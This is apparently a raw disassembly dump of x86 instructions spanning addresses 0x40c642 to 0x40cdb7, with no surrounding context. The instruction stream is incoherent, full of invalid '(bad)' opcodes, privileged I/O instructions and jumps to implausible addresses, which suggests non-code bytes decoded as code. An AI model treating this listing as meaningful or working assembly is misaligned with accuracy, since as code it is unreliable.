  40c642:	out    dx,eax
  40c643:	dec    ebp
  40c644:	xor    eax,0xff81d5bb
  40c649:	hlt    
  40c64a:	lds    eax,FWORD PTR [ebx+0x4c3296a5]
  40c650:	ins    DWORD PTR es:[edi],dx
  40c651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c652:	jae    0x40c6bf
  40c654:	imul   ecx,eax,0xa5154cf3
  40c65a:	fmul   st,st(6)
  40c65c:	leave  
  40c65d:	ds hlt 
  40c65f:	sbb    al,0x46
  40c661:	neg    BYTE PTR [ebx-0x58]
  40c664:	iret   
  40c665:	pop    edi
  40c666:	dec    esi
  40c667:	dec    edx
  40c668:	jmp    FWORD PTR [ecx+0x256b2c42]
  40c66e:	into   
  40c66f:	sub    eax,0x61efb220
  40c674:	fcomi  st,st(1)
  40c676:	stc    
  40c677:	lds    esp,FWORD PTR [ecx+esi*2-0x74d48d59]
  40c67e:	div    ah
  40c680:	cmp    DWORD PTR [eax],edi
  40c682:	mov    ds:0x554cab64,eax
  40c687:	adc    DWORD PTR [eax+0x1e9e493e],eax
  40c68d:	mov    esi,0xae9ad346
  40c692:	cwde   
  40c693:	mov    eax,ds:0xaaeb8de
  40c698:	rcr    BYTE PTR [ebx],1
  40c69a:	fsubr  DWORD PTR ds:0xadd68846
  40c6a0:	stc    
  40c6a1:	(bad)  
  40c6a3:	retf   0x708c
  40c6a6:	ins    BYTE PTR es:[edi],dx
  40c6a7:	jne    0x40c70a
  40c6a9:	jno    0x40c6f5
  40c6ab:	adc    eax,0x253b53ff
  40c6b0:	adc    eax,ebx
  40c6b2:	retf   
  40c6b3:	add    eax,0x339ca5d5
  40c6b8:	scas   eax,DWORD PTR es:[edi]
  40c6b9:	jl     0x40c6bb
  40c6bb:	and    ebp,DWORD PTR [edi]
  40c6bd:	rol    BYTE PTR [edx+eiz*8-0x69],0x40
  40c6c2:	rcr    cl,1
  40c6c4:	push   edx
  40c6c5:	(bad)  
  40c6c6:	retf   0xa930
  40c6c9:	ja     0x7aec23f9
  40c6cf:	sbb    BYTE PTR [edi+0x2214a893],0xba
  40c6d6:	sbb    eax,0x840b7df5
  40c6db:	(bad)  
  40c6dc:	sub    eax,0x7085b011
  40c6e1:	sbb    eax,0x34d0a8a2
  40c6e6:	mov    edx,DWORD PTR [edi+0xf]
  40c6e9:	mov    ebx,0xb66636d8
  40c6ee:	les    ebx,FWORD PTR [edi+0x2e]
  40c6f1:	shl    BYTE PTR [esi],0x59
  40c6f4:	jne    0x40c6fd
  40c6f6:	xor    al,0x44
  40c6f9:	or     eax,0xfdde1f58
  40c6fe:	aas    
  40c6ff:	jmp    0x628d6907
  40c704:	cvtps2pd xmm6,QWORD PTR [ebp-0x5e]
  40c708:	adc    DWORD PTR [edi+0x22d6e227],0xffffffd8
  40c70f:	dec    ebp
  40c710:	pushf  
  40c711:	adc    ah,BYTE PTR [ebp+0x222318a2]
  40c717:	sub    al,0xbd
  40c719:	push   edx
  40c71a:	sub    BYTE PTR [edi-0x608519cb],bh
  40c720:	mov    al,ds:0xb03f3d3b
  40c725:	pushf  
  40c726:	mov    ebp,DWORD PTR [edx+0x4996fdf6]
  40c72c:	call   0xdb521af9
  40c731:	cs mov al,0xef
  40c734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c735:	bound  ebp,QWORD PTR [eax+0x7b]
  40c738:	pop    ds
  40c739:	in     al,0x32
  40c73b:	aaa    
  40c73c:	dec    ecx
  40c73d:	ja     0x40c702
  40c73f:	call   0x9742:0x8e3e0128
  40c746:	loop   0x40c752
  40c748:	mov    ebx,0xef54599d
  40c74d:	out    dx,al
  40c74e:	jno    0x40c772
  40c750:	fadd   DWORD PTR [edi+edx*8]
  40c753:	pop    ebp
  40c754:	(bad)
  40c757:	(bad)
  40c75b:	mov    dl,0x46
  40c75d:	dec    ebp
  40c75e:	rol    DWORD PTR [edx-0x50],cl
  40c761:	shl    DWORD PTR ds:0x4bb302e,cl
  40c767:	jmp    0x40c702
  40c769:	ins    BYTE PTR es:[edi],dx
  40c76a:	add    BYTE PTR [ebp+0x365e93af],0x11
  40c771:	mov    ?,WORD PTR [ecx-0x5b]
  40c774:	cmp    ebp,ebx
  40c776:	clc    
  40c777:	nop
  40c778:	or     cl,0x1d
  40c77b:	imul   ecx,DWORD PTR [edi],0xefd97ab9
  40c781:	in     al,0x5c
  40c783:	xchg   ebx,eax
  40c784:	scas   eax,DWORD PTR es:[edi]
  40c785:	xchg   DWORD PTR [edx],esi
  40c787:	aad    0x95
  40c789:	cli    
  40c78a:	xor    al,0xb1
  40c78c:	mov    ds:0xd7f1b267,eax
  40c791:	pop    esp
  40c792:	inc    eax
  40c793:	in     al,0x27
  40c795:	and    al,0x7a
  40c797:	retf   0xc4e8
  40c79a:	test   cl,ch
  40c79c:	dec    ecx
  40c79d:	push   ebx
  40c79e:	mov    cl,0xd4
  40c7a0:	inc    ebp
  40c7a1:	mov    es,WORD PTR [esi-0x40705a82]
  40c7a7:	je     0x40c789
  40c7a9:	jle    0x40c79b
  40c7ab:	into   
  40c7ac:	dec    ecx
  40c7ad:	xchg   ebx,eax
  40c7ae:	add    al,0x14
  40c7b0:	je     0x40c80b
  40c7b2:	dec    eax
  40c7b3:	pop    esp
  40c7b4:	jb     0x40c816
  40c7b6:	(bad)  
  40c7b7:	jge    0x40c78a
  40c7b9:	fsub   QWORD PTR [edi-0x64cdc7c2]
  40c7bf:	ret    
  40c7c0:	retf   0x4f68
  40c7c3:	mov    eax,ds:0x4dee37c5
  40c7c8:	fs dec edi
  40c7ca:	adc    bl,ch
  40c7cc:	(bad)  
  40c7cd:	fisttp QWORD PTR [eax]
  40c7cf:	sub    DWORD PTR [edi-0x767cf2a1],ecx
  40c7d5:	out    dx,eax
  40c7d6:	je     0x40c827
  40c7d8:	mov    ecx,0xf1b26ca3
  40c7dd:	pop    ecx
  40c7de:	arpl   WORD PTR [ebx],di
  40c7e0:	repz loop 0x40c7c8
  40c7e3:	mov    BYTE PTR [ecx],ch
  40c7e5:	mov    cl,0xd8
  40c7e7:	and    eax,0xbb919287
  40c7ec:	inc    edx
  40c7ed:	(bad)  
  40c7ee:	js     0x40c83c
  40c7f0:	stos   DWORD PTR es:[edi],eax
  40c7f1:	out    dx,eax
  40c7f2:	mov    ebx,0x858e2b48
  40c7f7:	adc    ch,0x98
  40c7fa:	cld    
  40c7fb:	and    BYTE PTR [edi-0x64],0x8e
  40c7ff:	imul   esi,esp,0x13
  40c802:	xor    DWORD PTR [eax+0x33],edx
  40c805:	loopne 0x40c7df
  40c807:	sti    
  40c808:	iret   
  40c809:	xor    BYTE PTR [edx],ch
  40c80b:	in     al,dx
  40c80c:	push   ebp
  40c80d:	ss mov ebx,0x7ecb8a02
  40c813:	ins    BYTE PTR es:[edi],dx
  40c814:	mov    cl,0xa3
  40c816:	jae    0x40c7f2
  40c818:	rcl    DWORD PTR ds:0x54d7a7,0xc0
  40c81f:	dec    eax
  40c820:	arpl   dx,cx
  40c822:	sub    ah,BYTE PTR [ecx+0x4b7e3000]
  40c828:	cmp    al,0xb8
  40c82a:	cs mov bl,0xab
  40c82d:	adc    DWORD PTR [ebp-0x66e72e1a],edi
  40c833:	int3   
  40c834:	sub    ah,al
  40c836:	aad    0xe7
  40c838:	sahf   
  40c839:	xor    eax,0xb11a73ab
  40c83e:	xchg   edi,eax
  40c83f:	mov    edx,0x65d8e386
  40c844:	mov    ah,0xbe
  40c846:	inc    edi
  40c847:	ja     0x40c8a4
  40c849:	in     al,dx
  40c84a:	ins    BYTE PTR es:[edi],dx
  40c84b:	xchg   edi,eax
  40c84c:	xchg   DWORD PTR [edx+0x2bf8188e],edx
  40c852:	addr16 jl 0x40c890
  40c855:	xor    eax,0xaaca3997
  40c85a:	inc    ecx
  40c85b:	xchg   ebx,eax
  40c85c:	loope  0x40c7e6
  40c85e:	scas   al,BYTE PTR es:[edi]
  40c85f:	clc    
  40c860:	xor    eax,0x61108ada
  40c865:	add    edi,0xffffffaf
  40c868:	dec    ecx
  40c869:	mov    ds:0x46a8021c,al
  40c86e:	mov    bh,0x4d
  40c870:	nop
  40c871:	lahf   
  40c872:	cwde   
  40c873:	xchg   ebp,eax
  40c874:	add    bh,BYTE PTR [ecx]
  40c876:	scas   eax,DWORD PTR es:[edi]
  40c877:	(bad)  
  40c878:	fdiv   DWORD PTR [ecx]
  40c87a:	pusha  
  40c87b:	xor    DWORD PTR [edx-0xfdb6d98],ebp
  40c881:	jbe    0x40c8c6
  40c883:	rcr    BYTE PTR [edi-0x4be5b29],1
  40c889:	sbb    DWORD PTR [ebp-0x2744f2b6],ebp
  40c88f:	iret   
  40c890:	bound  eax,QWORD PTR [eax+0x43]
  40c893:	sub    DWORD PTR [eax+edi*2+0x505e75cc],edi
  40c89a:	loopne 0x40c868
  40c89c:	inc    edi
  40c89d:	xchg   esi,eax
  40c89e:	(bad)  
  40c89f:	std    
  40c8a0:	push   ebx
  40c8a1:	lds    esp,FWORD PTR [edx]
  40c8a3:	sbb    al,0xac
  40c8a5:	pushf  
  40c8a6:	jnp    0x40c918
  40c8a8:	retf   
  40c8a9:	cmp    eax,esi
  40c8ab:	cmp    eax,0x5d01f049
  40c8b0:	and    al,0x9d
  40c8b2:	push   es
  40c8b3:	inc    edx
  40c8b4:	add    al,0x45
  40c8b6:	(bad)  
  40c8b7:	pop    ds
  40c8b8:	mov    bh,0x64
  40c8ba:	ret    
  40c8bb:	mov    ebx,0xc2524f79
  40c8c0:	inc    ebx
  40c8c1:	mov    WORD PTR [edx+ebp*2+0x1c],cs
  40c8c5:	mov    ds:0x3384d41f,al
  40c8ca:	jp     0x40c8d6
  40c8cc:	push   esp
  40c8cd:	and    DWORD PTR ds:0xc544b1c1,esi
  40c8d3:	ret    
  40c8d4:	xor    eax,0x945bfb68
  40c8d9:	ins    BYTE PTR es:[edi],dx
  40c8da:	mov    cl,BYTE PTR [ebx]
  40c8dc:	mov    esp,0x81b829c9
  40c8e1:	lods   al,BYTE PTR ds:[esi]
  40c8e2:	aas    
  40c8e3:	sub    DWORD PTR [esi],esp
  40c8e5:	inc    ebp
  40c8e6:	inc    DWORD PTR [ecx]
  40c8e8:	mov    edi,0x1fb26f7b
  40c8ed:	push   ebp
  40c8ee:	test   al,0xcd
  40c8f0:	pop    ecx
  40c8f1:	arpl   WORD PTR [eax],si
  40c8f3:	test   ah,cl
  40c8f5:	xor    edi,DWORD PTR [ebp+edi*2-0x38]
  40c8f9:	mov    cl,0x7c
  40c8fb:	xchg   DWORD PTR [edx],eax
  40c8fd:	and    DWORD PTR [ecx],edi
  40c8ff:	pop    ebp
  40c900:	outs   dx,DWORD PTR es:[esi]
  40c902:	or     al,0x5f
  40c904:	bound  ebx,QWORD PTR [edi]
  40c906:	icebp  
  40c907:	(bad)  
  40c908:	xlat   BYTE PTR ds:[ebx]
  40c909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c90a:	mov    al,ds:0xeac6ec67
  40c90f:	test   al,0xbb
  40c911:	jne    0x40c8f0
  40c913:	(bad)  
  40c914:	clc    
  40c915:	lods   eax,DWORD PTR ds:[esi]
  40c916:	push   edi
  40c917:	inc    ecx
  40c918:	jno    0x40c991
  40c91a:	mov    eax,0x4136fb74
  40c91f:	dec    ecx
  40c920:	add    BYTE PTR [ecx+0x3b64d07a],cl
  40c926:	jne    0x40c90a
  40c928:	fwait
  40c929:	pop    ss
  40c92a:	mov    esi,0xf09cde0f
  40c92f:	inc    ebp
  40c930:	test   eax,0x1d49e71b
  40c935:	imul   esp,DWORD PTR [ecx+0x4b683b16],0x1f82f76e
  40c93f:	lds    esp,FWORD PTR [ebx+0x2c]
  40c942:	(bad)  
  40c943:	pop    eax
  40c944:	mov    dl,0x2a
  40c946:	jb     0x40c99d
  40c948:	mov    eax,ds:0xda4ef350
  40c94d:	push   ebp
  40c94e:	stos   BYTE PTR es:[edi],al
  40c94f:	outs   dx,DWORD PTR ds:[esi]
  40c950:	or     eax,0xadd1fcd6
  40c955:	inc    ecx
  40c956:	mov    cl,0xd3
  40c958:	pusha  
  40c959:	mov    bl,BYTE PTR [esp+esi*4+0x69]
  40c95d:	sbb    BYTE PTR ds:0x2a4154ce,cl
  40c963:	xor    esi,DWORD PTR [ebp-0x2d]
  40c966:	rol    DWORD PTR [ebx-0x12a2a4c3],1
  40c96c:	pusha  
  40c96d:	bound  ebp,QWORD PTR ds:0xc5dfb960
  40c973:	pusha  
  40c974:	push   0xffffffdd
  40c976:	ret    
  40c977:	inc    ebx
  40c978:	mov    dh,0x59
  40c97a:	(bad)  
  40c97c:	iret   
  40c97d:	add    eax,esp
  40c97f:	(bad)  
  40c980:	sub    eax,0x168b0bfd
  40c985:	rcr    DWORD PTR [edi+0xa],1
  40c988:	(bad)  
  40c989:	adc    al,0x69
  40c98b:	repz push es
  40c98d:	rcl    ecx,cl
  40c98f:	xor    eax,0xb2482dde
  40c994:	pop    eax
  40c995:	cmp    al,0xfb
  40c997:	pop    esp
  40c998:	iret   
  40c999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c99a:	(bad)  
  40c99b:	mov    DWORD PTR [eax],edi
  40c99d:	xchg   BYTE PTR [ebp+0xc2fd258],al
  40c9a3:	sub    ebp,edi
  40c9a5:	jp     0x40c9a0
  40c9a7:	js     0x40c981
  40c9a9:	or     ebx,DWORD PTR [ecx]
  40c9ab:	adc    al,0xb
  40c9ad:	pop    edi
  40c9ae:	out    dx,al
  40c9af:	and    cl,ch
  40c9b1:	jg     0x40c971
  40c9b3:	fidiv  DWORD PTR [esi]
  40c9b5:	(bad)  
  40c9b6:	imul   esi,DWORD PTR [ebp-0x52e1b6c7],0x731f7a6b
  40c9c0:	dec    bp
  40c9c2:	push   ecx
  40c9c3:	addr16 xor al,0x4a
  40c9c6:	sbb    dl,al
  40c9c8:	sbb    DWORD PTR [ebp+0xc2e6208],eax
  40c9ce:	sbb    eax,0x7067fc7a
  40c9d3:	(bad)  
  40c9d4:	std    
  40c9d5:	jl     0x40ca3c
  40c9d7:	cmp    ebp,DWORD PTR ds:0xdddf6287
  40c9dd:	popa   
  40c9de:	data16 loope 0x40c996
  40c9e1:	dec    ebx
  40c9e2:	inc    ebp
  40c9e3:	rol    BYTE PTR [ebp+0xf],0xe8
  40c9e7:	inc    esp
  40c9e8:	retf   0x1e51
  40c9eb:	and    bh,BYTE PTR [edi-0x9132fbb]
  40c9f1:	sti    
  40c9f2:	dec    edx
  40c9f3:	lock into 
  40c9f5:	add    al,0x33
  40c9f7:	out    dx,al
  40c9f8:	push   ebx
  40c9f9:	test   BYTE PTR [edi-0x22],bh
  40c9fc:	adc    edi,DWORD PTR [edx+edi*1-0x26]
  40ca00:	outs   dx,DWORD PTR ds:[esi]
  40ca01:	test   DWORD PTR [edi-0x5c4c6dff],0x1c263101
  40ca0b:	pop    ss
  40ca0c:	and    DWORD PTR [ebp+ebp*1-0x37ce369e],edi
  40ca13:	retf   
  40ca14:	repnz dec ebx
  40ca16:	(bad)  
  40ca17:	pop    edx
  40ca18:	sbb    BYTE PTR [ebx+ebp*8-0x64],bh
  40ca1c:	shl    edi,1
  40ca1e:	push   edx
  40ca1f:	out    dx,al
  40ca20:	leave  
  40ca21:	mov    eax,DWORD PTR [ecx]
  40ca23:	and    cl,0xc
  40ca26:	mov    al,0x99
  40ca28:	repnz pop edi
  40ca2a:	aas    
  40ca2b:	xor    DWORD PTR [ebp-0x66955ae],ecx
  40ca31:	mov    dl,0x8a
  40ca33:	rcl    DWORD PTR ds:0x136fcce6,cl
  40ca39:	je     0x40c9f1
  40ca3b:	loopne 0x40ca38
  40ca3d:	jg     0x40ca14
  40ca3f:	cmc    
  40ca40:	popf   
  40ca41:	pop    ss
  40ca42:	xchg   edi,eax
  40ca43:	xor    edx,esp
  40ca45:	neg    DWORD PTR [ecx+0x32]
  40ca48:	mov    ss,WORD PTR [edx+0x52cc9e92]
  40ca4e:	mov    WORD PTR [ecx-0x7fd7c5de],cs
  40ca54:	jno    0x40c9ec
  40ca56:	out    0xb7,al
  40ca58:	ins    BYTE PTR es:[edi],dx
  40ca59:	dec    ecx
  40ca5a:	add    eax,DWORD PTR [edx]
  40ca5c:	fcomp  DWORD PTR [edx]
  40ca5e:	xchg   BYTE PTR [edx],cl
  40ca60:	mov    eax,ds:0x7e20d5b8
  40ca65:	gs sahf 
  40ca67:	rol    DWORD PTR [esi-0x16d5d69e],0x4b
  40ca6e:	sbb    al,0xf7
  40ca70:	scas   al,BYTE PTR es:[edi]
  40ca71:	cmp    BYTE PTR [edx+0x6569238f],ch
  40ca77:	fadd   DWORD PTR [edx+0x77]
  40ca7a:	arpl   dx,ax
  40ca7c:	cmp    BYTE PTR [eax-0x36ad9fd9],0xc8
  40ca83:	adc    dl,dl
  40ca85:	test   eax,0x2bacd4d3
  40ca8a:	es pop eax
  40ca8c:	loope  0x40ca93
  40ca8e:	jnp    0x40ca98
  40ca90:	outs   dx,DWORD PTR ds:[esi]
  40ca91:	fidivr DWORD PTR [edx-0x304fb2c4]
  40ca97:	xor    DWORD PTR [edi+edi*4+0x5a],ebx
  40ca9b:	icebp  
  40ca9c:	popf   
  40ca9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca9e:	push   ds
  40ca9f:	es jne 0x40ca7f
  40caa2:	loop   0x40cb10
  40caa4:	sbb    al,0x95
  40caa6:	pop    ebx
  40caa7:	or     al,0x9d
  40caa9:	jno    0x40caeb
  40caab:	pop    edi
  40caac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caad:	adc    eax,0x28703f49
  40cab2:	aam    0x74
  40cab4:	clc    
  40cab5:	jmp    0xf17:0xbf940a6b
  40cabc:	sbb    DWORD PTR ss:[esi],0xfffffffe
  40cac0:	dec    ebx
  40cac1:	int    0x4d
  40cac3:	or     eax,0xba732391
  40cac8:	enter  0x234,0xf9
  40cacc:	pop    ds
  40cacd:	add    DWORD PTR [ecx],edx
  40cacf:	cli    
  40cad0:	mov    eax,0x643df641
  40cad6:	or     DWORD PTR [esi-0x70],ebx
  40cad9:	push   ebx
  40cada:	jl     0x40cb2d
  40cadc:	icebp  
  40cadd:	cs icebp 
  40cadf:	push   es
  40cae0:	mov    dh,0xf8
  40cae2:	sub    al,0xce
  40cae4:	add    eax,0x3385f674
  40cae9:	inc    esi
  40caea:	in     al,dx
  40caeb:	adc    BYTE PTR [esi],0xab
  40caee:	ins    BYTE PTR es:[edi],dx
  40caef:	jbe    0x40cb68
  40caf1:	mov    es,WORD PTR [esi-0x52]
  40caf4:	fs adc dh,cl
  40caf7:	xor    BYTE PTR [ecx-0x4dd68057],0xe4
  40cafe:	jge    0x40ca9d
  40cb00:	add    DWORD PTR [edx+0x5959d279],edx
  40cb06:	jae    0x40cb11
  40cb08:	leave  
  40cb09:	push   edx
  40cb0a:	sub    BYTE PTR [eax-0x68],bh
  40cb0d:	idiv   BYTE PTR [edi]
  40cb0f:	dec    edi
  40cb10:	or     al,0x5e
  40cb12:	ja     0x40cb8e
  40cb14:	push   ss
  40cb15:	adc    DWORD PTR [esi],eax
  40cb17:	jno    0x40cb18
  40cb19:	push   0xffffffea
  40cb1b:	cs lock dec ebp
  40cb1e:	sub    eax,DWORD PTR [esi+0x5b]
  40cb21:	or     al,0x7b
  40cb23:	xor    esi,DWORD PTR [esi]
  40cb25:	sbb    eax,0x85c8eeaa
  40cb2a:	or     edi,DWORD PTR [ebp-0x22c6e9c7]
  40cb30:	mov    es,WORD PTR [eax-0x74]
  40cb33:	xor    DWORD PTR [eiz*8+0x142a0986],ebx
  40cb3a:	fs cmp eax,0x267e65c2
  40cb40:	sub    BYTE PTR [edx],ah
  40cb42:	ins    DWORD PTR es:[edi],dx
  40cb43:	inc    ebx
  40cb44:	jno    0x40cba3
  40cb46:	cs push edx
  40cb48:	fiadd  WORD PTR [ebx+ebp*2+0x7d]
  40cb4c:	mov    cl,0x1e
  40cb4e:	jg     0x40cb60
  40cb50:	sbb    DWORD PTR [ebx-0x41947ace],0xcc08341a
  40cb5a:	stos   BYTE PTR es:[edi],al
  40cb5b:	frndint 
  40cb5d:	inc    ecx
  40cb5e:	pop    esp
  40cb5f:	xor    ebp,edx
  40cb61:	sar    bl,1
  40cb63:	loope  0x40cb76
  40cb65:	mov    ebx,0x2cf934d9
  40cb6a:	mov    esi,0xe7341a9c
  40cb6f:	aaa    
  40cb70:	call   0x39d6087b
  40cb75:	mov    al,ds:0xc30e3dc9
  40cb7a:	sbb    BYTE PTR [eax+edx*8-0x76],al
  40cb7e:	clc    
  40cb7f:	ret    
  40cb80:	cmc    
  40cb81:	pop    ss
  40cb82:	add    bl,dh
  40cb84:	call   FWORD PTR ds:0x2bd8b72e
  40cb8a:	mov    dl,0x1d
  40cb8c:	pushf  
  40cb8d:	sbb    BYTE PTR [esi-0xd],bl
  40cb90:	push   0xc335a973
  40cb95:	mov    esi,0x20cfb95c
  40cb9a:	xor    ebx,0x44269352
  40cba0:	xor    al,0xe2
  40cba2:	mov    edx,0x855618c2
  40cba7:	mov    bh,0xdc
  40cba9:	add    al,0x6
  40cbab:	dec    esi
  40cbac:	add    esi,ecx
  40cbae:	int    0xe1
  40cbb0:	jb     0x40cc23
  40cbb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbb3:	aaa    
  40cbb4:	jnp    0x40cb89
  40cbb6:	sbb    bx,WORD PTR [ebx+ecx*8-0x36]
  40cbbb:	push   0x96f8e730
  40cbc0:	aaa    
  40cbc1:	lods   eax,DWORD PTR ds:[esi]
  40cbc2:	int    0xff
  40cbc4:	sbb    al,0x3
  40cbc6:	sub    al,0xdc
  40cbc8:	sbb    eax,0xd17e76f7
  40cbcd:	xchg   DWORD PTR [ebp-0x900affa],edx
  40cbd3:	mul    DWORD PTR [esi+0x36]
  40cbd6:	es sahf 
  40cbd8:	and    cl,BYTE PTR [edi]
  40cbda:	out    0xd4,eax
  40cbdc:	leave  
  40cbdd:	jp     0x40cc2a
  40cbdf:	daa    
  40cbe0:	repnz push es
  40cbe2:	dec    edi
  40cbe3:	ja     0x40cbc6
  40cbe5:	pop    ebp
  40cbe6:	mov    ds:0xcc8c8fc6,al
  40cbeb:	ja     0x40cbc9
  40cbed:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40cbef:	in     eax,dx
  40cbf0:	mov    eax,ds:0xbf121059
  40cbf5:	cs hlt 
  40cbf7:	mov    eax,ds:0xc660bc3c
  40cbfc:	std    
  40cbfd:	int    0x53
  40cbff:	aam    0xef
  40cc01:	lds    eax,FWORD PTR [esi-0x5ec02343]
  40cc07:	cmc    
  40cc08:	ret    0xc7e8
  40cc0b:	enter  0x446e,0x2
  40cc0f:	dec    ecx
  40cc10:	jo     0x40cc6c
  40cc12:	mov    edx,0x4d803d8f
  40cc17:	pop    eax
  40cc18:	or     DWORD PTR [ebx],edx
  40cc1a:	adc    ecx,ebx
  40cc1c:	sahf   
  40cc1d:	adc    eax,0x26f81656
  40cc22:	cwde   
  40cc23:	outs   dx,DWORD PTR ds:[esi]
  40cc24:	mov    ?,WORD PTR [esi]
  40cc26:	xchg   esp,eax
  40cc27:	add    BYTE PTR [eax],ch
  40cc29:	dec    eax
  40cc2a:	push   edi
  40cc2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc2c:	pushf  
  40cc2d:	xor    BYTE PTR [ecx+eax*4],0x3d
  40cc31:	psubsb mm0,QWORD PTR [edi-0x17]
  40cc35:	aad    0xac
  40cc37:	ins    DWORD PTR es:[edi],dx
  40cc38:	push   0x2a
  40cc3a:	add    BYTE PTR [edi+0x5f],dh
  40cc3d:	xchg   ebp,eax
  40cc3e:	sub    eax,0x1e4b46eb
  40cc43:	out    0xf3,al
  40cc45:	mov    ecx,DWORD PTR [edx+0x74d6476c]
  40cc4b:	aad    0x40
  40cc4d:	jle    0x40cca0
  40cc4f:	push   ss
  40cc50:	retf   0x4813
  40cc53:	in     eax,dx
  40cc54:	loopne 0x40cc10
  40cc56:	pop    ebx
  40cc57:	fwait
  40cc58:	push   cs
  40cc59:	outs   dx,DWORD PTR ds:[esi]
  40cc5a:	mov    eax,0xad0a27d9
  40cc5f:	mov    ecx,0x1316465
  40cc64:	xchg   esp,eax
  40cc65:	or     bl,ch
  40cc67:	cdq    
  40cc68:	repz inc edi
  40cc6a:	adc    DWORD PTR [edi+0x6a],0x21d878af
  40cc71:	inc    ecx
  40cc72:	pop    edi
  40cc73:	clc    
  40cc74:	cwde   
  40cc75:	mov    esp,0x35c2ff32
  40cc7a:	dec    esi
  40cc7b:	(bad)  
  40cc7c:	(bad)  [ebx-0x76ab6f94]
  40cc82:	das    
  40cc83:	in     al,dx
  40cc84:	inc    edx
  40cc85:	cmc    
  40cc86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc87:	pop    edx
  40cc88:	lea    edi,[eax-0x79]
  40cc8b:	jne    0x40ccec
  40cc8d:	jge    0x40cc3c
  40cc8f:	sbb    ch,BYTE PTR [eax-0x7b]
  40cc92:	es push eax
  40cc94:	xchg   edi,eax
  40cc95:	adc    DWORD PTR ds:0xc8afaec0,ebp
  40cc9b:	cdq    
  40cc9c:	and    ebp,DWORD PTR [edi-0x57561473]
  40cca2:	in     eax,dx
  40cca3:	inc    esp
  40cca4:	mov    bl,0x54
  40cca6:	sub    al,0x53
  40cca8:	adc    eax,0x15f6d20b
  40ccad:	outs   dx,DWORD PTR ds:[esi]
  40ccae:	adc    ah,BYTE PTR [ecx-0x6b]
  40ccb1:	dec    ebp
  40ccb2:	fimul  DWORD PTR [esi-0x11]
  40ccb5:	sbb    ecx,DWORD PTR [ebp-0x68ced30c]
  40ccbb:	xchg   esi,eax
  40ccbc:	test   DWORD PTR [edx],eax
  40ccbe:	lds    esp,FWORD PTR [edx-0x5faa52d1]
  40ccc4:	stos   BYTE PTR es:[edi],al
  40ccc5:	pop    ds
  40ccc6:	sbb    eax,0xde15f8c9
  40cccb:	sti    
  40cccc:	add    dl,dl
  40ccce:	inc    ax
  40ccd0:	arpl   di,ax
  40ccd2:	push   esi
  40ccd3:	push   edx
  40ccd4:	cmp    esp,esp
  40ccd6:	or     cl,BYTE PTR [esi-0x5f]
  40ccd9:	inc    esp
  40ccda:	(bad)  
  40ccdb:	push   eax
  40ccdc:	pop    ss
  40ccdd:	sbb    eax,0xe0aa1aad
  40cce2:	jb     0x40cd60
  40cce4:	enter  0xa7c,0xaf
  40cce8:	fs popa 
  40ccea:	imul   esp,DWORD PTR [ebx+ebp*1-0x12],0x2f
  40ccef:	sbb    BYTE PTR [edi],bh
  40ccf1:	mov    ebx,DWORD PTR [esi-0x679450d7]
  40ccf7:	inc    esp
  40ccf8:	loopne 0x40cd21
  40ccfa:	add    dh,BYTE PTR [esi-0x7e7e628a]
  40cd00:	mov    esp,0x95bc933d
  40cd05:	mov    bl,0xe7
  40cd07:	faddp  st(1),st
  40cd09:	mov    esi,0xb61e146d
  40cd0e:	(bad)  [edi]
  40cd10:	sbb    al,0xe8
  40cd12:	mov    ecx,DWORD PTR ds:0x51a9f13d
  40cd18:	jg     0x40cd8f
  40cd1a:	mov    ch,0x37
  40cd1c:	jle    0x40cd5c
  40cd1e:	sar    DWORD PTR [edi+0x6ba4428a],1
  40cd24:	mov    esp,0x5213b88f
  40cd29:	mov    ah,0x35
  40cd2b:	mov    al,ds:0xaa3e1512
  40cd30:	pop    ecx
  40cd31:	cmp    eax,0x41bf2148
  40cd36:	scas   eax,DWORD PTR es:[edi]
  40cd37:	jmp    0x3c01:0x5b4adb1e
  40cd3e:	dec    esp
  40cd3f:	pusha  
  40cd40:	add    edx,DWORD PTR [ecx]
  40cd42:	inc    ebx
  40cd43:	dec    esi
  40cd44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd45:	cmp    eax,0x5641e062
  40cd4a:	push   0xdf55e1ab
  40cd4f:	adc    dl,BYTE PTR [esi-0x354a08f7]
  40cd55:	sbb    BYTE PTR [ebx+edx*2],0x5a
  40cd59:	mov    edi,0x3b7cb305
  40cd5e:	inc    ebx
  40cd5f:	in     eax,dx
  40cd60:	lods   eax,DWORD PTR ds:[esi]
  40cd61:	(bad)  
  40cd62:	xor    bh,dh
  40cd64:	inc    esp
  40cd65:	pusha  
  40cd66:	mov    ds:0x207c613e,al
  40cd6b:	outs   dx,DWORD PTR ds:[esi]
  40cd6c:	cmc    
  40cd6d:	test   al,0x77
  40cd6f:	push   ss
  40cd70:	sub    ecx,edx
  40cd72:	mov    cs,WORD PTR [ebp+0x4ea4a041]
  40cd78:	mov    eax,0x19faf350
  40cd7d:	test   DWORD PTR [edx-0x24],ebx
  40cd80:	ja     0x40cd94
  40cd82:	pop    ebp
  40cd83:	or     eax,0x7e3aebf0
  40cd88:	dec    eax
  40cd89:	popa   
  40cd8a:	push   ecx
  40cd8b:	imul   edx,DWORD PTR ds:0x94ec189d,0xc9d22b99
  40cd95:	leave  
  40cd96:	not    BYTE PTR [ebx+0x5]
  40cd99:	leavew 
  40cd9b:	push   edx
  40cd9c:	adc    BYTE PTR [ebx+ecx*2],0xf1
  40cda0:	stos   DWORD PTR es:[edi],eax
  40cda1:	int3   
  40cda2:	sub    ecx,DWORD PTR [ebx+ecx*2]
  40cda5:	push   es
  40cda6:	inc    ecx
  40cda7:	arpl   WORD PTR [edi+0x212a7cf7],di
  40cdad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdae:	cdq    
  40cdaf:	ficom  DWORD PTR [edx-0x66]
  40cdb2:	jb     0x40ce2d
  40cdb4:	add    esp,esp
  40cdb6:	xchg   ebx,eax
  40cdb7:	inc    ecx
